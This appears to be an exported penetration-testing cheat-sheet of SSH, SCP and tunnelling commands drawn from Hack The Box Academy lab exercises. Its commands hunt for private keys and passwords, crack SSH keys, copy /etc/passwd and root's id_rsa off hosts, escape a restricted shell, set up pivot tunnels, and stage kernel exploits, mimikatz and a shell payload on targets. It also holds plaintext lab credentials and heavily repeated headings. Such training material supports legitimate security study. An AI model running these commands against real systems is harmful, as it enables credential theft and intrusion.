# SSH / SCP / port forwarding

% ssh, scp, tunnel, portfw, cpts

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-keys
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-keys-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
cat /home/jsmith/.ssh/SSH.private
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-keys-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh-keygen -yf ~/.ssh/id_ed25519
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-keys-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
john --wordlist=rockyou.txt ssh.hash
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - looking-for-files-containing-stuff
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
grep 'pass' -r /home/ 2>/dev/null
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - looking-for-files-containing-stuff-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
/home/jbetty/.bash_history:sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - log-files
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\ | session opened\ | session closed\ | failure\ | failed\ | ssh\ | password changed\ | new user\ | delete user\ | sudo\ | COMMAND\=\ | logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\ | session opened\ | session closed\ | failure\ | failed\ | ssh\ | password changed\ | new user\ | delete user\ | sudo\ | COMMAND\=\ | logs" $i 2>/dev/null;fi;done
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
sudo systemctl enable ssh
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
sudo systemctl start ssh
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
netstat -lnpt
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
scp plaintext@192.168.49.128:/root/myroot.txt .
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-5
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - commands
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - commands-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
./ssh-audit.py 10.129.14.132
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - commands-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
Abuse Rsync [link](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) Synthaxe [link](https://phoenixnap.com/kb/how-to-rsync-over-ssh) R-commands [link](https://en.wikipedia.org/wiki/Berkeley_r

```
htb-student 10.0.17.5
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - port-forwarding-with-ssh
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh -L 1080:localhost:1080 172.30.1.10 -i ~/.ssh/ed25519-phoenix
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - execute-local-port-forward
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - execute-local-port-forward-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - dynamic-port-forwarding
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh -D 9050 ubuntu@10.129.202.64
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - using-ssh--r
#cat/PIVOT/TUNNEL-PORTFW #cpts
![b646e385c029e9870521da67a6657a50.png](:/c10f615a74904712b51481af5caa3c84) Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's

```
ssh -R <ip>:8080:0.0.0.0:8000 ubuntu@<ip> -vN
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - using-plinkexe
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
plink -ssh -D 9050 ubuntu@10.129.15.50
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - transferring-rpivot-to-the-target
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
scp -r rpivot ubuntu@<ip>:/home/ubuntu/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - transferring-ptunnel-ng-to-the-pivot-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - tunneling-an-ssh-connection-through-an-icmp-tunnel
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh -p2222 -lubuntu 127.0.0.1
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - enabling-dynamic-port-forwarding-over-ssh
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - connecting-via-ssh
#cat/PIVOT/TUNNEL-PORTFW #cpts
We can connect to the provided Parrot Linux attack host using the command, then enter the provided password when prompted. Introduction to Active Directory Enumeration & Attacks

```
ssh htb-student@
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - checking-for-ssh-listening-port
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
(Not all processes could be identified, non-owned process info
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - confirming-port-forward-with-netstat
#cat/PIVOT/TUNNEL-PORTFW #cpts
Dynamic Port Forwarding with SSH and SOCKS Tunneling

```
netstat -antp | grep 1234
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - looking-for-opportunities-to-pivot-using-ifconfig
#cat/PIVOT/TUNNEL-PORTFW #cpts
Dynamic Port Forwarding with SSH and SOCKS Tunneling

```
:~$ ifconfig
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - using-rdp_scanner-module
#cat/PIVOT/TUNNEL-PORTFW #cpts
Dynamic Port Forwarding with SSH and SOCKS Tunneling

```
msf6 > search rdp_scanner
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - transferring-payload-to-pivot-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
Remote/Reverse Port Forwarding with SSH

```
scp backupscript.exe ubuntu@<ip>:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - starting-python3-webserver-on-pivot-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
Remote/Reverse Port Forwarding with SSH

```
python3 -m http.server 8123
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - viewing-the-logs-from-the-pivot
#cat/PIVOT/TUNNEL-PORTFW #cpts
Remote/Reverse Port Forwarding with SSH

```
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - meterpreter-session-established
#cat/PIVOT/TUNNEL-PORTFW #cpts
Remote/Reverse Port Forwarding with SSH

```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - installing-sshuttle-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
SSH Pivoting with Sshuttle

```
(Reading database ... 468019 files and directories currently installed.)
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - obtain-a-password-hash-for-a-domain-user-account-that-can-be-leveraged-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
shell-session
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then, the files can be transferred to the ParrotOS jump-box using `scp`:

```
scp PowerView.ps1 htb-student@STMIP:/home/htb-student/Desktop
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then, the files can be transferred to the ParrotOS jump-box using `scp`:

```
scp kerbrute_windows_amd64.exe htb-student@STMIP:/home/htb-student/Desktop
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
PowerView.ps1 100% 752KB 1.2MB/s 00:00
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/PIVOT/TUNNEL-PORTFW #cpts
Using the privileges of the super user, students will need to extract passwords from memory using `mimikatz.exe`, however first, it must be transferred to the jump-box:

```
scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - targeting-an-ssh-server
#cat/PIVOT/TUNNEL-PORTFW #cpts
Imagine a scenario where you need to test the security of an SSH server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attac

```
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - leverage-sqladmin-rights-to-authenticate-to-the-academy-ea-db01-host-1
#cat/PIVOT/TUNNEL-PORTFW #cpts
Using the same `xfreerdp` connection established in question 1 of this section, students need to open `Command Prompt` and SSH to EA-ATTACK01 using the credentials `htb-student:HTB_@cademy_stdnt!`:

```
ssh htb-student@172.16.5.225
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - leverage-sqladmin-rights-to-authenticate-to-the-academy-ea-db01-host-1-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
The authenticity of host '172.16.5.225 (172.16.5.225)' can't be established.
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - obtain-a-password-hash-for-a-domain-user-account-that-can-be-leveraged-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
┌─[us-academy-2]─[10.10.14.69]─[htb-ac594497@htb-n7rjfuoj2q]─[~]
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - we-placed-the-source-code-of-the-application-we-just-covered-at-optass
#cat/PIVOT/TUNNEL-PORTFW #cpts
After spawning the target machine, students need to use SCP to copy the file `app.py` using the credentials `root:!x4;EW[ZLwmDx?=w`, and then analyze the source code with `VS Code`:

```
scp root@STMIP:/opt/asset-manager/app.py .
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - users-home-directory-contents
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ls -la /home/stacey.jenkins/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-directory-contents
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ls -l ~/.ssh
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - bash-history
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
history
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - all-hidden-directories
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
find / -type d -name ".*" -ls 2>/dev/null
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - temporary-files
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ls -l /tmp /var/tmp /dev/shm
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - proc
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - credential-hunting
#cat/PIVOT/TUNNEL-PORTFW #cpts
The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configur

```
:~$ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - ssh-keys-5
#cat/PIVOT/TUNNEL-PORTFW #cpts
It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may

```
:~$ ls ~/.ssh
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - docker-shared-directories
#cat/PIVOT/TUNNEL-PORTFW #cpts
When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made acces

```
:/hostsystem/home/cry0l1t3$ ls -l
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - docker-shared-directories-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.

```
ssh cry0l1t3@ -i cry0l1t3.priv
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - docker-sockets
#cat/PIVOT/TUNNEL-PORTFW #cpts
Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

```
:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - extracting-roots-ssh-key
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - find-suid-binaries
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
:~$ find / -perm -4000 2>/dev/null
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - use-different-approaches-to-escape-the-restricted-shell-and-read-the-f
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students need to use a search engine and look for Rbash bypasses, eventually finding the following article [Linux Restricted Shell Bypass | VK9 Security (vk9-sec.com)](https://vk9-sec.com/linux-restricted-shell-bypass/).

```
ssh htb-user@STMIP -t "bash --noprofile"
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - use-different-approaches-to-escape-the-restricted-shell-and-read-the-f-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ ssh htb-user@10.129.37.149 -t "bash --noprofile"
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - find-a-file-with-the-setuid-bit-set-that-was-not-shown-in-the-section-
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - use-the-privileged-group-rights-of-the-secaudit-user-to-locate-a-flag
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students first need to connect to `STMIP` with `SSH` using the credentials `secaudit:Academy_LLPE!`:

```
ssh secaudit@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - connect-to-the-target-system-and-escalate-privileges-using-the-screen-
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students then need to transfer the executable exploit to `STMIP` using any file transfer method, such as with `scp`, utilizing the credentials `htb-student:Academy_LLPE!`:

```
scp 41154.sh htb-student@PWNIP:/home/htb-student/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students first need to clone the repository for LogRotten and transfer it to the target using `scp` and the credentials `htb-student:HTB_@cademy_stdnt!`:

```
git clone https://github.com/whotwagner/logrotten.git
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students first need to clone the repository for LogRotten and transfer it to the target using `scp` and the credentials `htb-student:HTB_@cademy_stdnt!`:

```
scp -r logrotten/ htb-student@STMIP:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ scp -r logrotten/ htb-student@10.129.204.41:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-using-a-different-kernel-exploit-submit-the-conten
#cat/PIVOT/TUNNEL-PORTFW #cpts
Subsequently, students need to use `scp` to transfer the compiled exploit to the target machine:

```
scp kernelExploit htb-student@STMIP:/home/htb-student/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students need to first clone the repository for the [Pwnkit PoC](https://github.com/arthepsy/CVE-2021-4034.git), and then transfer it to the target using `scp` with the credentials `htb-student:HTB_@cademy_stdnt!`:

```
git clone https://github.com/arthepsy/CVE-2021-4034.git
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-5
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students need to first clone the repository for the [Pwnkit PoC](https://github.com/arthepsy/CVE-2021-4034.git), and then transfer it to the target using `scp` with the credentials `htb-student:HTB_@cademy_stdnt!`:

```
scp -r CVE-2021-4034/ htb-student@STMIP:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-6
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ scp -r CVE-2021-4034/ htb-student@10.129.205.113:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-8
#cat/PIVOT/TUNNEL-PORTFW #cpts
First, students need to clone the repository for the [Dirty Pipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git) exploit and then transfer it to the target using `scp`, utilizing the credentials `ht

```
scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@STMIP:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-9
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@10.129.204.55:~/
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - submit-the-contents-of-flag2txt
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
cd /home/barry
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - submit-the-contents-of-flag2txt-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
mysql -u root -p
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - submit-the-contents-of-flag2txt-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
cd ~
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - submit-the-contents-of-flag2txt-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the-
#cat/PIVOT/TUNNEL-PORTFW #cpts
Using the credentials `srvadm:ILFreightnixadm!` harvested from the previous question, students need to connect to `STMIP` over SSH:

```
ssh srvadm@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the--2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students will notice that the invoking user can run `/usr/bin/openssl` as root, thus, they need to abuse this misconfiguration to get the root user's SSH key, as per [GTFOBins](https://gtfobins.github.io/gtfobins/openssl

```
sudo /usr/bin/openssl enc -in $LFILE
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the--3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
:~$ sudo /usr/bin/openssl enc -in $LFILE
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the--4
#cat/PIVOT/TUNNEL-PORTFW #cpts
Afterward, students need to use the private key to connect to the `STMIP` over SSH as the user `root`:

```
sudo ssh -i id_rsa root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the--5
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ sudo ssh -i id_rsa root@10.129.203.114
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students need to setup pivoting, either with SSH or `Metasploit`, both of which will be described below, starting with the former. Using the SSH private key harvested from the previous section's question, students need t

```
ssh -D 9050 -i id_rsa root@STMIP
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ ssh -D 9050 -i id_rsa root@10.129.203.114
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then, students need to transfer the payload to the root user on `STMIP` using the SSH private key harvested from before:

```
scp -i id_rsa shell.elf root@STMIP:/tmp
```

## SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - SSH / SCP / port forwarding - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ scp -i id_rsa shell.elf root@10.129.203.114:/tmp
```

